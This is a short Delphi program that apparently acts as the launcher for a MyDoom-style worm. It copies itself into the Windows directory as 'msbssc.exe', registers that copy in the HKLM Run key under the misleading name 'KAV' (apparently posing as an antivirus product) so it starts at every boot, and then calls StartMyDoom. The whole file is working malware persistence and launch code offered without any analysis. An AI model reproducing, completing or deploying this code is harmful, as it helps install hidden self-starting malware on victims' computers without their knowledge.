   PROGRAM Project2;

   uses
     Windows,
     uMyDoom in 'uMyDoom.pas';

   VAR
    hkey_    : HKEY;
    FileName : STRING;

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir : ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     WinPath:=STRING(PWindowsDir)+'\';
   END;

   BEGIN
     FileName:=WinPath+'msbssc.exe';
     RegCreateKeyEx(HKEY_LOCAL_MACHINE,
                    'software\microsoft\windows\currentversion\run',
                    0,
                    NIL,
                    REG_OPTION_NON_VOLATILE,
                    KEY_ALL_ACCESS,
                    NIL,
                    hkey_,
                    NIL);
     RegSetValueExA(hKey_,
                    'KAV',
                    0,
                    REG_SZ,
                    @FileName[1],
                    50);
     RegCloseKey(hkey_);
     CopyFile(pChar(ParamStr(0)),pChar(FileName),False);
     StartMyDoom(300);
   END.
